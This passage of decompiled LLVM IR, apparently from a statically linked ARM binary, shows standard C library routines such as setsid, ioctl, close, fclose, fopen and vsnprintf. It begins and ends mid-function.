  ret i32 %v1_fa14

; uselistorder directives
  uselistorder i32 %v0_f9f0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fa10, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fa18 = load i32, i32* @r7, align 4
  store i32 %v3_fa18, i32* %stack_var_-8, align 4
  %v0_fa24 = load i32, i32* @r0, align 4
  store i32 %v0_fa24, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_fa24, -4095
  br i1 %tmp, label %dec_label_pc_fa44, label %dec_label_pc_fa34

dec_label_pc_fa34:                                ; preds = %entry
  %v0_fa34 = call i32 @__GI___errno_location()
  %v0_fa38 = load i32, i32* %r7.global-to-local, align 4
  %v1_fa38 = sub i32 0, %v0_fa38
  %v2_fa3c = inttoptr i32 %v0_fa34 to i32*
  store i32 %v1_fa38, i32* %v2_fa3c, align 4
  %v2_fa44.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_fa44

dec_label_pc_fa44:                                ; preds = %entry, %dec_label_pc_fa34
  %v1_fa48 = phi i32 [ %v0_fa24, %entry ], [ -1, %dec_label_pc_fa34 ]
  %v2_fa44 = phi i32 [ %v3_fa18, %entry ], [ %v2_fa44.pre, %dec_label_pc_fa34 ]
  store i32 %v2_fa44, i32* @r7, align 4
  ret i32 %v1_fa48

; uselistorder directives
  uselistorder i32 %v0_fa24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fa44, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_fa4c = load i32, i32* @r3, align 4
  store i32 %v9_fa4c, i32* %stack_var_-4, align 4
  %v2_fa58 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fa58, i32* @r3, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_fa8c, label %dec_label_pc_fa7c

dec_label_pc_fa7c:                                ; preds = %entry
  %v0_fa7c = call i32 @__GI___errno_location()
  %v0_fa80 = load i32, i32* %r7.global-to-local, align 4
  %v1_fa80 = sub i32 0, %v0_fa80
  store i32 %v1_fa80, i32* @r3, align 4
  %v2_fa84 = inttoptr i32 %v0_fa7c to i32*
  store i32 %v1_fa80, i32* %v2_fa84, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_fa8c

dec_label_pc_fa8c:                                ; preds = %entry, %dec_label_pc_fa7c
  %v0_fa8c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_fa7c ]
  ret i32 %v0_fa8c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_fa8c, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_faa4.outer

dec_label_pc_faa4.outer:                          ; preds = %dec_label_pc_fabc, %entry
  %v0_faa4.ph = phi i32 [ %v0_faa4.pre.pre, %dec_label_pc_fabc ], [ %arg1, %entry ]
  %tmp = icmp ult i32 %v0_faa4.ph, -4095
  br label %dec_label_pc_faa4

dec_label_pc_faa4:                                ; preds = %dec_label_pc_faa4.outer, %dec_label_pc_faa4
  br i1 %tmp, label %dec_label_pc_faa4, label %dec_label_pc_fabc

dec_label_pc_fabc:                                ; preds = %dec_label_pc_faa4
  %v0_fabc = call i32 @__GI___errno_location()
  %v1_fac0 = sub i32 0, %v0_faa4.ph
  %v2_fac4 = inttoptr i32 %v0_fabc to i32*
  store i32 %v1_fac0, i32* %v2_fac4, align 4
  %v0_faa4.pre.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_faa4.outer

; uselistorder directives
  uselistorder i32 %v0_faa4.ph, { 1, 0 }
  uselistorder label %dec_label_pc_faa4, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_facc = load i32, i32* @r7, align 4
  store i32 %v3_facc, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_faf8, label %dec_label_pc_fae8

dec_label_pc_fae8:                                ; preds = %entry
  %v0_fae8 = call i32 @__GI___errno_location()
  %v0_faec = load i32, i32* %r7.global-to-local, align 4
  %v1_faec = sub i32 0, %v0_faec
  %v2_faf0 = inttoptr i32 %v0_fae8 to i32*
  store i32 %v1_faec, i32* %v2_faf0, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_fafc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_faf8

dec_label_pc_faf8:                                ; preds = %entry, %dec_label_pc_fae8
  %v2_fafc = phi i32 [ %v3_facc, %entry ], [ %v2_fafc.pre, %dec_label_pc_fae8 ]
  %v0_faf8 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_fae8 ]
  store i32 %v2_fafc, i32* @r7, align 4
  ret i32 %v0_faf8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_faf8, { 1, 0 }
}

define i32 @__GI_close(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_fb04 = load i32, i32* @r7, align 4
  store i32 %v3_fb04, i32* %stack_var_-8, align 4
  %v0_fb10 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_fb10, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_fb10, -4095
  br i1 %tmp, label %dec_label_pc_fb30, label %dec_label_pc_fb20

dec_label_pc_fb20:                                ; preds = %entry
  %v0_fb20 = call i32 @__GI___errno_location()
  %v0_fb24 = load i32, i32* %r7.global-to-local, align 4
  %v1_fb24 = sub i32 0, %v0_fb24
  %v2_fb28 = inttoptr i32 %v0_fb20 to i32*
  store i32 %v1_fb24, i32* %v2_fb28, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_fb30.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_fb30

dec_label_pc_fb30:                                ; preds = %entry, %dec_label_pc_fb20
  %v1_fb34 = phi i32 [ %v0_fb10, %entry ], [ -1, %dec_label_pc_fb20 ]
  %v2_fb30 = phi i32 [ %v3_fb04, %entry ], [ %v2_fb30.pre, %dec_label_pc_fb20 ]
  store i32 %v2_fb30, i32* @r7, align 4
  ret i32 %v1_fb34

; uselistorder directives
  uselistorder i32 %v0_fb10, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fb30, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v4_fb44 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 3528) to i32*), align 4
  %v2_fb48 = mul i32 %arg1, 2
  %v2_fb4c = add i32 %v4_fb44, %v2_fb48
  %v3_fb4c = inttoptr i32 %v2_fb4c to i16*
  %v4_fb4c = load i16, i16* %v3_fb4c, align 2
  %v6_fb4c = zext i16 %v4_fb4c to i32
  %v1_fb50 = and i32 %v6_fb4c, 32
  ret i32 %v1_fb50
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  %v1_fb64 = add i32 %arg1, 128
  %v2_fb68 = icmp ugt i32 %v1_fb64, 383
  %v0_fb70 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_fb68, i32 %v0_fb70)
  %v4_fb78 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 3536) to i32*), align 4
  %v2_fb7c = mul i32 %arg1, 2
  %v2_fb80 = add i32 %v4_fb78, %v2_fb7c
  %v3_fb80 = inttoptr i32 %v2_fb80 to i16*
  %v4_fb80 = load i16, i16* %v3_fb80, align 2
  %v6_fb80 = sext i16 %v4_fb80 to i32
  ret i32 %v6_fb80
}

define i32 @__GI___errno_location() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r3, align 4
  ret i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 29308)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_fbac = load i32, i32* @r4, align 4
  store i32 %v3_fbac, i32* %stack_var_-36, align 4
  %v6_fbac = load i32, i32* @r5, align 4
  %v9_fbac = load i32, i32* @r6, align 4
  %v12_fbac = load i32, i32* @r7, align 4
  %v15_fbac = load i32, i32* @r8, align 4
  %v27_fbac = load i32, i32* @lr, align 4
  %v2_fbb0 = add i32 %tmp, 52
  %v3_fbb0 = inttoptr i32 %v2_fbb0 to i32*
  %v4_fbb0 = load i32, i32* %v3_fbb0, align 4
  %v1_fbb8 = sub i32 1, %v4_fbb0
  %v2_fbb8 = icmp ult i32 %v4_fbb0, 2
  br i1 %v2_fbb8, label %thread-pre-split, label %bb

bb:                                               ; preds = %entry
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_fbb8, %entry ]
  %v0_fbc0 = phi i32 [ 0, %bb ], [ %v1_fbb8, %entry ]
  store i32 %storemerge, i32* %sb.global-to-local, align 4
  %v2_fbc0 = icmp eq i32 %v0_fbc0, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @r6, align 4
  br i1 %v2_fbc0, label %dec_label_pc_fc0c, label %dec_label_pc_fbd4

dec_label_pc_fbd4:                                ; preds = %thread-pre-split
  %v4_fbec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_fbec)
  %v0_fc00 = load i32, i32* @r6, align 4
  %v2_fc00 = add i32 %v0_fc00, 16
  %v3_fc00 = inttoptr i32 %v2_fc00 to i32*
  %v4_fc00 = load i32, i32* %v3_fc00, align 4
  call void @__pseudo_branch(i32 %v4_fc00)
  %v0_fc0c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_fc0c

dec_label_pc_fc0c:                                ; preds = %thread-pre-split, %dec_label_pc_fbd4
  %v1_fc14 = phi i32 [ %tmp, %thread-pre-split ], [ %v0_fc0c.pre, %dec_label_pc_fbd4 ]
  %v1_fc0c = inttoptr i32 %v1_fc14 to i16*
  %v2_fc0c = load i16, i16* %v1_fc0c, align 2
  %v3_fc0c = zext i16 %v2_fc0c to i32
  %v1_fc10 = and i32 %v3_fc0c, 64
  %v2_fc10 = icmp eq i32 %v1_fc10, 0
  br i1 %v2_fc10, label %bb18, label %bb17

bb17:                                             ; preds = %dec_label_pc_fc0c
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_fc0c, %bb17
  %storemerge24 = phi i32 [ %v1_fc14, %bb17 ], [ %v1_fc10, %dec_label_pc_fc0c ]
  %v1_fc18 = xor i1 %v2_fc10, true
  call void @__pseudo_cond_branch(i1 %v1_fc18, i32 ptrtoint (i32* @global_var_116c4.594 to i32))
  store i32 %storemerge24, i32* %sl.global-to-local, align 4
  %v0_fc20 = load i32, i32* @r5, align 4
  %v1_fc20 = add i32 %v0_fc20, 4
  %v2_fc20 = inttoptr i32 %v1_fc20 to i32*
  %v3_fc20 = load i32, i32* %v2_fc20, align 4
  %v1_fc24 = call i32 @__GI_close(i32 %v3_fc20)
  %v0_fc2c = load i32, i32* @r6, align 4
  %v2_fc38 = add i32 %v0_fc2c, 112
  %v3_fc38 = inttoptr i32 %v2_fc38 to i32*
  %v4_fc38 = load i32, i32* %v3_fc38, align 4
  store i32 %v4_fc38, i32* @r7, align 4
  %v1_fc40 = load i32, i32* @r5, align 4
  %v2_fc40 = add i32 %v1_fc40, 4
  %v3_fc40 = inttoptr i32 %v2_fc40 to i32*
  store i32 -1, i32* %v3_fc40, align 4
  %v0_fc48 = load i32, i32* @r6, align 4
  %v2_fc48 = add i32 %v0_fc48, 76
  %v3_fc48 = inttoptr i32 %v2_fc48 to i32*
  %v4_fc48 = load i32, i32* %v3_fc48, align 4
  %v1_fc50 = icmp slt i32 %v1_fc24, 0
  store i32 %v4_fc48, i32* %stack_var_-80, align 4
  br i1 %v1_fc50, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  call void @__pseudo_branch(i32 %v4_fc48)
  %v0_fc78 = load i32, i32* @r6, align 4
  %v2_fc78 = add i32 %v0_fc78, 16
  %v3_fc78 = inttoptr i32 %v2_fc78 to i32*
  %v4_fc78 = load i32, i32* %v3_fc78, align 4
  call void @__pseudo_branch(i32 %v4_fc78)
  %v0_fc88 = load i32, i32* @r6, align 4
  %v2_fc88 = add i32 %v0_fc88, 12
  %v3_fc88 = inttoptr i32 %v2_fc88 to i32*
  %v4_fc88 = load i32, i32* %v3_fc88, align 4
  %v1_fc8c = inttoptr i32 %v4_fc88 to i32*
  %v2_fc8c = load i32, i32* %v1_fc8c, align 4
  %v1_fc94 = add i32 %v2_fc8c, 1
  %v2_fc98 = add i32 %v0_fc88, 24
  %v3_fc98 = inttoptr i32 %v2_fc98 to i32*
  %v4_fc98 = load i32, i32* %v3_fc98, align 4
  store i32 %v4_fc98, i32* @r4, align 4
  store i32 %v1_fc94, i32* %v1_fc8c, align 4
  call void @__pseudo_branch(i32 %v4_fc98)
  %v0_fcb0 = load i32, i32* @r5, align 4
  %v1_fcb0 = inttoptr i32 %v0_fcb0 to i16*
  %v2_fcb0 = load i16, i16* %v1_fcb0, align 2
  %v1_fcb4 = and i16 %v2_fcb0, 24576
  %v1_fcb8 = or i16 %v1_fcb4, 48
  %v0_fcbc = load i32, i32* %sb.global-to-local, align 4
  %v2_fcbc = icmp eq i32 %v0_fcbc, 0
  store i16 %v1_fcb8, i16* %v1_fcb0, align 2
  br i1 %v2_fcbc, label %.thread, label %bb21

bb21:                                             ; preds = %bb20
  br label %.thread

.thread:                                          ; preds = %bb20, %bb21
  %v2_fcd0 = xor i1 %v2_fcbc, true
  call void @__pseudo_cond_branch(i1 %v2_fcd0, i32 %v4_fc98)
  %v0_fcd4 = load i32, i32* @r5, align 4
  %v1_fcd4 = inttoptr i32 %v0_fcd4 to i16*
  %v2_fcd4 = load i16, i16* %v1_fcd4, align 2
  %v1_fcd8 = and i16 %v2_fcd4, 16384
  %v2_fcd8 = icmp eq i16 %v1_fcd8, 0
  br i1 %v2_fcd8, label %bb23, label %bb22

bb22:                                             ; preds = %.thread
  br label %bb23

bb23:                                             ; preds = %.thread, %bb22
  %v1_fce0 = xor i1 %v2_fcd8, true
  call void @__pseudo_cond_branch(i1 %v1_fce0, i32 ptrtoint (i32* @global_var_136fc.598 to i32))
  %v2_fcec = load i32, i32* %stack_var_-80, align 4
  call void @__pseudo_branch(i32 %v2_fcec)
  call void @__pseudo_branch(i32 %v4_fc78)
  %v0_fd0c = load i32, i32* @r6, align 4
  %v2_fd0c = add i32 %v0_fd0c, 52
  %v3_fd0c = inttoptr i32 %v2_fd0c to i32*
  %v4_fd0c = load i32, i32* %v3_fd0c, align 4
  %v1_fd10 = inttoptr i32 %v4_fd0c to i32*
  %v2_fd10 = load i32, i32* %v1_fd10, align 4
  %v1_fd14 = add i32 %v2_fd10, 1
  store i32 %v1_fd14, i32* %v1_fd10, align 4
  call void @__pseudo_branch(i32 %v4_fc98)
  %v0_fd2c = call i32 @_stdio_openlist_dec_use()
  %v0_fd30 = load i32, i32* %sl.global-to-local, align 4
  %v2_fd38 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_fd38, i32* @r4, align 4
  store i32 %v6_fbac, i32* @r5, align 4
  store i32 %v9_fbac, i32* @r6, align 4
  store i32 %v12_fbac, i32* @r7, align 4
  store i32 %v15_fbac, i32* @r8, align 4
  store i32 %v27_fbac, i32* @lr, align 4
  ret i32 %v0_fd30

; uselistorder directives
  uselistorder i1 %v2_fcd8, { 1, 0 }
  uselistorder i32 %v4_fc98, { 0, 2, 1, 3 }
  uselistorder i32 %v1_fbb8, { 1, 0 }
  uselistorder i32 %v4_fbb0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_fc0c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @function_fd44(i32 %arg1) local_unnamed_addr {
dec_label_pc_fd44:
  %v0_fd44 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_fd44, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_fd44
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_fd44, %bb
  %v10_fd5c = phi i32 [ %arg1, %dec_label_pc_fd44 ], [ 0, %bb ]
  ret i32 %v10_fd5c

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_fd70 = call i32 @_stdio_fopen()
  ret i32 %v0_fd70
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_fd8c = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_fd8c, i32* @r3, align 4
  store i32 -1, i32* @r1, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_fda0 = call i32 @__GI_vsnprintf()
  ret i32 %v0_fda0

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %v3_fdb4 = load i32, i32* @r4, align 4
  %v6_fdb4 = load i32, i32* @r5, align 4
  %v9_fdb4 = load i32, i32* @r6, align 4
  %v12_fdb4 = load i32, i32* @r7, align 4
  %v18_fdb4 = load i32, i32* @sl, align 4
  %v2_fdbc = ptrtoint i32* %stack_var_-112 to i32
  %v0_fdc0 = load i32, i32* @r0, align 4
  store i32 %v0_fdc0, i32* @r4, align 4
  store i32 0, i32* @sl, align 4
  %v2_fdc8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_fdc8, i32* @r0, align 4
  %v0_fdd0 = load i32, i32* @r3, align 4
  store i32 %v0_fdd0, i32* @r7, align 4
  store i32 1, i32* @ip, align 4
  %v0_fddc = load i32, i32* @r1, align 4
  store i32 %v0_fddc, i32* @r5, align 4
  %v0_fde0 = load i32, i32* @r2, align 4
  store i32 %v0_fde0, i32* @r6, align 4
  store i32 208, i32* %stack_var_-112, align 4
  %v1_fdf4 = call i32 @__stdio_init_mutex(i32 %v2_fdc8)
  %v0_fdf8 = load i32, i32* @r4, align 4
  %v1_fdf8 = sub i32 -1, %v0_fdf8
  %v0_fdfc = load i32, i32* @r5, align 4
  %v3_fdfc = icmp ult i32 %v0_fdfc, %v1_fdf8
  br i1 %v3_fdfc, label %bb26, label %bb

bb:                                               ; preds = %entry
  store i32 %v1_fdf8, i32* @r5, align 4
  br label %bb26

bb26:                                             ; preds = %entry, %bb
  %v1_fe04 = phi i32 [ %v0_fdfc, %entry ], [ %v1_fdf8, %bb ]
  %v2_fe04 = add i32 %v1_fe04, %v0_fdf8
  %v0_fe0c = load i32, i32* @r6, align 4
  %v0_fe10 = load i32, i32* @r7, align 4
  %v0_fe1c = load i32, i32* @sl, align 4
  %v5_fe28 = inttoptr i32 %v0_fdf8 to i8*
  %v15_fe30 = inttoptr i32 %v0_fe0c to i8*
  %v16_fe30 = call i32 @_vfprintf_internal(i32 %v2_fdbc, i8* %v15_fe30, i32 %v0_fe10, i32 %v2_fe04, i32 %v0_fdf8, i32 %v2_fe04, i32 %v0_fdf8, i32 %v0_fdf8, i32 %v0_fdf8, i32 %v2_fe04, i32 %v0_fe1c)
  %v0_fe34 = load i32, i32* @r5, align 4
  %v1_fe34 = load i32, i32* @sl, align 4
  %v9_fe34 = icmp eq i32 %v0_fe34, %v1_fe34
  br i1 %v9_fe34, label %dec_label_pc_fe5c, label %dec_label_pc_fe40

dec_label_pc_fe40:                                ; preds = %bb26
  %v3_fe04 = inttoptr i32 %v2_fe04 to i8*
  %v9_fe48 = icmp eq i8* %v5_fe28, %v3_fe04
  br i1 %v9_fe48, label %bb27, label %bb28

bb27:                                             ; preds = %dec_label_pc_fe40
  %v2_fe4c = add i32 %v0_fdf8, -1
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_fe40, %bb27
  %v1_fe50 = phi i32 [ %v2_fe04, %dec_label_pc_fe40 ], [ %v2_fe4c, %bb27 ]
  %v6_fe50 = inttoptr i32 %v1_fe50 to i8*
  %stack_var_-96.0 = select i1 %v9_fe48, i8* %v6_fe50, i8* %v5_fe28
  %v1_fe58 = trunc i32 %v1_fe34 to i8
  store i8 %v1_fe58, i8* %stack_var_-96.0, align 1
  br label %dec_label_pc_fe5c

dec_label_pc_fe5c:                                ; preds = %bb26, %bb28
  store i32 %v3_fdb4, i32* @r4, align 4
  store i32 %v6_fdb4, i32* @r5, align 4
  store i32 %v9_fdb4, i32* @r6, align 4
  store i32 %v12_fdb4, i32* @r7, align 4
  store i32 %v18_fdb4, i32* @sl, align 4
  ret i32 %v16_fe30

; uselistorder directives
  uselistorder i32 %v2_fe04, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_fdf8, { 2, 1, 0 }
  uselistorder i32 %v0_fdf8, { 2, 4, 5, 7, 3, 6, 1, 0 }
  uselistorder label %dec_label_pc_fe5c, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_fe68 = load i32, i32* @r4, align 4
  store i32 %v3_fe68, i32* %stack_var_-36, align 4
  %v6_fe68 = load i32, i32* @r5, align 4
  %v9_fe68 = load i32, i32* @r6, align 4
  %v18_fe68 = load i32, i32* @sb, align 4
  %v24_fe68 = load i32, i32* @fp, align 4
  %v0_fe6c = load i32, i32* @r1, align 4
  %v1_fe6c = inttoptr i32 %v0_fe6c to i8*
  %v2_fe6c = load i8, i8* %v1_fe6c, align 1
  %v3_fe6c = zext i8 %v2_fe6c to i32
  store i32 %v3_fe6c, i32* @ip, align 4
  %v7_fe74 = icmp eq i8 %v2_fe6c, 114
  store i32 ptrtoint (i32* @global_var_268d4.582 to i32), i32* @fp, align 4
  %v2_fe7c = ptrtoint i32* %stack_var_-72 to i32
  %v0_fe80 = load i32, i32* @r0, align 4
  store i32 %v0_fe80, i32* @r6, align 4
  %v0_fe84 = load i32, i32* @r2, align 4
  store i32 %v0_fe84, i32* @sb, align 4
  %v0_fe88 = load i32, i32* @r3, align 4
  store i32 %v0_fe88, i32* @r5, align 4
  br i1 %v7_fe74, label %dec_label_pc_fed4, label %dec_label_pc_fe90

dec_label_pc_fe90:                                ; preds = %entry
  %v7_fe90 = icmp eq i8 %v2_fe6c, 119
  br i1 %v7_fe90, label %bb, label %dec_label_pc_fe9c

bb:                                               ; preds = %dec_label_pc_fe90
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_fed8

dec_label_pc_fe9c:                                ; preds = %dec_label_pc_fe90
  %v7_fe9c = icmp eq i8 %v2_fe6c, 97
  br i1 %v7_fe9c, label %bb34, label %dec_label_pc_fea8

bb34:                                             ; preds = %dec_label_pc_fe9c
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_fed8

dec_label_pc_fea8:                                ; preds = %dec_label_pc_fe9c, %dec_label_pc_ff5c, %dec_label_pc_ff30
  %v0_fea8 = call i32 @__GI___errno_location()
  store i32 %v0_fea8, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_feb0 = load i32, i32* @sb, align 4
  %v2_feb0 = icmp eq i32 %v0_feb0, 0
  %v2_feb4 = inttoptr i32 %v0_fea8 to i32*
  store i32 22, i32* %v2_feb4, align 4
  br i1 %v2_feb0, label %dec_label_pc_10128, label %dec_label_pc_febc

dec_label_pc_febc:                                ; preds = %dec_label_pc_ff80._crit_edge, %dec_label_pc_fea8
  %v0_febc = load i32, i32* @sb, align 4
  %v1_febc = inttoptr i32 %v0_febc to i16*
  %v2_febc = load i16, i16* %v1_febc, align 2
  %v3_febc = zext i16 %v2_febc to i32
  store i32 %v3_febc, i32* %r3.global-to-local, align 4
  %v1_fec0 = and i32 %v3_febc, 8192
  %v2_fec0 = icmp eq i32 %v1_fec0, 0
  br i1 %v2_fec0, label %dec_label_pc_10128, label %dec_label_pc_fec8

dec_label_pc_fec8:                                ; preds = %dec_label_pc_febc
  store i32 %v0_febc, i32* @r0, align 4
  %v0_fecc = call i32 @free()
  store i32 %v0_fecc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10128

dec_label_pc_fed4:                                ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_fed8

dec_label_pc_fed8:                                ; preds = %bb, %bb34, %dec_label_pc_fed4
  %v1_fef0 = phi i32 [ 1089, %bb34 ], [ 577, %bb ], [ 1, %dec_label_pc_fed4 ]
  %v1_fed8 = add i32 %v0_fe6c, 1
  %v2_fed8 = inttoptr i32 %v1_fed8 to i8*
  %v3_fed8 = load i8, i8* %v2_fed8, align 1
  %v7_fedc = icmp eq i8 %v3_fed8, 98
  %v1_fed8.v0_fe6c = select i1 %v7_fedc, i32 %v1_fed8, i32 %v0_fe6c
  store i32 %v1_fed8.v0_fe6c, i32* %r3.global-to-local, align 4
  %v1_fee8 = add i32 %v1_fed8.v0_fe6c, 1
  %v2_fee8 = inttoptr i32 %v1_fee8 to i8*
  %v3_fee8 = load i8, i8* %v2_fee8, align 1
  %v4_fee8 = zext i8 %v3_fee8 to i32
  store i32 %v4_fee8, i32* @r3, align 4
  %v7_feec = icmp eq i8 %v3_fee8, 43
  br i1 %v7_feec, label %bb37, label %.thread5

bb37:                                             ; preds = %dec_label_pc_fed8
  store i32 %v1_fef0, i32* @r3, align 4
  %v2_fef4 = add nuw nsw i32 %v1_fef0, 1
  store i32 %v2_fef4, i32* @r4, align 4
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_fed8, %bb37
  %v2_fef8 = icmp eq i32 %v0_fe84, 0
  br i1 %v2_fef8, label %dec_label_pc_ff00, label %dec_label_pc_ff28

dec_label_pc_ff00:                                ; preds = %.thread5
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_ff04 = call i32 @malloc(i32 80)
  store i32 %v1_ff04, i32* %r0.global-to-local, align 4
  store i32 %v1_ff04, i32* @sb, align 4
  %v3_ff08 = icmp eq i32 %v1_ff04, 0
  br i1 %v3_ff08, label %dec_label_pc_1012c, label %dec_label_pc_ff10

dec_label_pc_ff10:                                ; preds = %dec_label_pc_ff00
  %v2_ff14 = add i32 %v1_ff04, 8
  %v3_ff14 = inttoptr i32 %v2_ff14 to i32*
  store i32 0, i32* %v3_ff14, align 4
  store i32 8192, i32* %r3.global-to-local, align 4
  %v2_ff1c = load i32, i32* @sb, align 4
  %v3_ff1c = inttoptr i32 %v2_ff1c to i16*
  store i16 8192, i16* %v3_ff1c, align 2
  %v0_ff20 = load i32, i32* @sb, align 4
  %v1_ff20 = add i32 %v0_ff20, 56
  store i32 %v1_ff20, i32* @r0, align 4
  %v1_ff24 = call i32 @__stdio_init_mutex(i32 %v1_ff20)
  store i32 %v1_ff24, i32* %r0.global-to-local, align 4
  %v0_ff28.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_ff28

dec_label_pc_ff28:                                ; preds = %.thread5, %dec_label_pc_ff10
  %v0_ff80 = phi i32 [ %v0_fe88, %.thread5 ], [ %v0_ff28.pre, %dec_label_pc_ff10 ]
  %v1_ff28 = icmp slt i32 %v0_ff80, 0
  br i1 %v1_ff28, label %dec_label_pc_ff80, label %dec_label_pc_ff30

dec_label_pc_ff30:                                ; preds = %dec_label_pc_ff28
  %v0_ff34 = load i32, i32* @r4, align 4
  %v2_ff34 = and i32 %v0_ff34, 131075
  %v1_ff38 = add nuw nsw i32 %v2_ff34, 1
